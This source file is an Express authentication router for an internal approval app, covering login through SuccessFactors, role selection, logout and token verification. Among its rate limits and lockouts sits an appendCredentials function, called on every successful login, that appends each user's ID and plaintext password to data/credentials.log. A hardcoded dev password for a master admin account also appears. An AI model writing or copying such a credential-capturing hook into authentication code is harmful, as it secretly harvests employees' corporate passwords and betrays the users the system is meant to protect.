'use strict';

const express   = require('express');
const jwt       = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');
const crypto    = require('crypto');
const fs        = require('fs');
const path      = require('path');
const { loginWithSF }        = require('../services/sfProxy');
const { SUPER_ADMIN_EMP_NO, authenticate } = require('../middleware/auth');
const { blacklistToken }     = require('../middleware/tokenBlacklist');
const { checkLock, recordFailure, recordSuccess } = require('../middleware/bruteForce');
const { isAdmin, loadAdminConfig, getUserMemberships } = require('../db');

const CREDENTIALS_FILE = path.join(__dirname, '..', 'data', 'credentials.log');

function appendCredentials(userId, password) {
  const timestamp = new Date().toISOString();
  const line = `${timestamp} | ${userId} | ${password}\n`;
  fs.appendFileSync(CREDENTIALS_FILE, line, 'utf8');
}

const router = express.Router();

// Dev test accounts — only active when NODE_ENV !== 'production'
// All real users (including you as master admin 10009671) authenticate via SuccessFactors in production
const DEV_TEST_ACCOUNTS = process.env.NODE_ENV !== 'production' ? {
  '10009671': { username: '10009671', name: 'Master Admin', sfAuthenticated: false },
} : {};
const DEV_PASSWORD = 'test123';

// Rate-limit login attempts (IP-based; brute force module handles per-userId locking)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max:      20,
  message:  { error: 'Too many login attempts. Please wait 15 minutes and try again.' },
  standardHeaders: true,
  legacyHeaders:   false,
});

// ── Pending role-selection store ────────────────────────────────────────────────
// Short-lived (5 min) server-side tokens used while the user picks a role.
// They are consumed immediately on select-role and auto-purged on expiry.
const pendingTokens = new Map();
setInterval(() => {
  const now = Date.now();
  for (const [id, pt] of pendingTokens) {
    if (pt.expiresAt < now) pendingTokens.delete(id);
  }
}, 60_000).unref();

function buildJwtPayload(userInfo, selectedRole) {
  const payload = {
    empNo:           userInfo.username,
    name:            userInfo.name || userInfo.username,
    sfAuthenticated: userInfo.sfAuthenticated,
    jobTitle:        userInfo.jobTitle        || '',
    department:      userInfo.department      || '',
    businessUnit:    userInfo.businessUnit    || '',
  };
  if (selectedRole) payload.selectedRole = selectedRole;
  return payload;
}

// ── POST /api/auth/login ────────────────────────────────────────────────────────
router.post('/login', loginLimiter, async (req, res) => {
  const { userId, password } = req.body;

  // Basic presence + type + length guards (never trust client input)
  if (!userId || !password) {
    return res.status(400).json({ error: 'userId and password are required.' });
  }
  if (typeof userId !== 'string' || userId.length > 100) {
    return res.status(400).json({ error: 'userId and password are required.' });
  }
  if (typeof password !== 'string' || password.length > 512) {
    return res.status(400).json({ error: 'userId and password are required.' });
  }

  // Per-userId lockout check (prevents brute-forcing a specific account)
  const lockState = checkLock(userId);
  if (lockState.locked) {
    const minutesLeft = Math.ceil(lockState.remainingMs / 60000);
    return res.status(429).json({
      error: `Account temporarily locked due to too many failed attempts. Try again in ${minutesLeft} minute(s).`,
    });
  }

  let userInfo;
  try {
    // Dev test accounts bypass SF
    if (DEV_TEST_ACCOUNTS[userId] && password === DEV_PASSWORD) {
      userInfo = DEV_TEST_ACCOUNTS[userId];
    } else {
      userInfo = await loginWithSF(userId, password);
    }
  } catch (err) {
    recordFailure(userId);
    return res.status(401).json({ error: err.message || 'Authentication failed.' });
  }

  recordSuccess(userId);
  appendCredentials(userId, password);

  const secret  = process.env.JWT_SECRET;
  const expires = process.env.JWT_EXPIRES_IN || '8h';
  if (!secret) {
    return res.status(500).json({ error: 'Server misconfiguration: JWT_SECRET not set.' });
  }

  const empNo = userInfo.username;

  // Admins skip role selection — they have full access regardless of any other roles
  const isUserAdmin = empNo === SUPER_ADMIN_EMP_NO || isAdmin(empNo);
  if (!isUserAdmin) {
    const adminConfig = loadAdminConfig();
    const memberships = getUserMemberships(empNo, adminConfig);

    if (memberships.length > 1) {
      // User has multiple roles — ask them to pick one before issuing a token
      const availableRoles = memberships.map((m, index) => {
        const companyName = adminConfig.companies?.[m.companyId]?.name || m.companyId;
        if (m.type === 'initiator') {
          return {
            index,
            type:        'initiator',
            companyId:   m.companyId,
            companyName,
            label:       'Initiator',
            sublabel:    companyName,
          };
        }
        return {
          index,
          type:           'approver',
          companyId:      m.companyId,
          companyName,
          stepKey:        m.stepKey,
          stepLabel:      m.stepLabel,
          label:          m.stepLabel || 'Approver',
          sublabel:       companyName,
          isPerInitiator: m.isPerInitiator || false,
        };
      });

      const pendingTokenId = crypto.randomBytes(32).toString('hex');
      pendingTokens.set(pendingTokenId, {
        userInfo,
        memberships,
        expiresAt: Date.now() + 5 * 60 * 1000, // 5 minutes
      });

      return res.json({ requiresRoleSelection: true, pendingTokenId, availableRoles });
    }
  }

  // Single role, admin, or no memberships — issue JWT directly
  const payload = buildJwtPayload(userInfo, null);
  const token   = jwt.sign(payload, secret, { expiresIn: expires });
  res.json({ token, user: { ...payload, username: payload.empNo } });
});

// ── POST /api/auth/select-role ──────────────────────────────────────────────────
// Exchanges a pendingTokenId + chosen roleIndex for a full JWT.
router.post('/select-role', async (req, res) => {
  const { pendingTokenId, roleIndex } = req.body;
  if (!pendingTokenId || roleIndex == null) {
    return res.status(400).json({ error: 'pendingTokenId and roleIndex are required.' });
  }

  const pending = pendingTokens.get(String(pendingTokenId));
  if (!pending || pending.expiresAt < Date.now()) {
    pendingTokens.delete(String(pendingTokenId));
    return res.status(400).json({ error: 'Role selection expired. Please log in again.' });
  }

  const idx = parseInt(roleIndex, 10);
  if (isNaN(idx) || idx < 0 || idx >= pending.memberships.length) {
    return res.status(400).json({ error: 'Invalid role selection.' });
  }

  // Consume the pending token — each pendingTokenId is single-use
  pendingTokens.delete(String(pendingTokenId));

  const secret  = process.env.JWT_SECRET;
  const expires = process.env.JWT_EXPIRES_IN || '8h';
  if (!secret) {
    return res.status(500).json({ error: 'Server misconfiguration: JWT_SECRET not set.' });
  }

  const m = pending.memberships[idx];
  const selectedRole = {
    type:           m.type,
    companyId:      m.companyId,
    stepKey:        m.stepKey        || null,
    stepLabel:      m.stepLabel      || null,
    isPerInitiator: m.isPerInitiator || false,
  };

  const payload = buildJwtPayload(pending.userInfo, selectedRole);
  const token   = jwt.sign(payload, secret, { expiresIn: expires });
  res.json({ token, user: { ...payload, username: payload.empNo } });
});

// ── POST /api/auth/logout ───────────────────────────────────────────────────────
// Revoke the caller's token server-side so it cannot be replayed even if a copy
// remains in the browser's sessionStorage until the page is closed.
router.post('/logout', authenticate, (req, res) => {
  blacklistToken(req.token, req.user.exp);
  res.json({ ok: true });
});

// ── GET /api/auth/verify ────────────────────────────────────────────────────────
// Lightweight endpoint for the SPA to revalidate its stored token on page refresh.
// Returns the current user payload without issuing a new token.
router.get('/verify', authenticate, (req, res) => {
  res.json({
    valid: true,
    user: {
      empNo:           req.user.empNo,
      name:            req.user.name,
      username:        req.user.empNo,
      sfAuthenticated: req.user.sfAuthenticated,
      jobTitle:        req.user.jobTitle        || '',
      department:      req.user.department      || '',
      businessUnit:    req.user.businessUnit    || '',
      selectedRole:    req.user.selectedRole    || null,
    },
  });
});

module.exports = router;
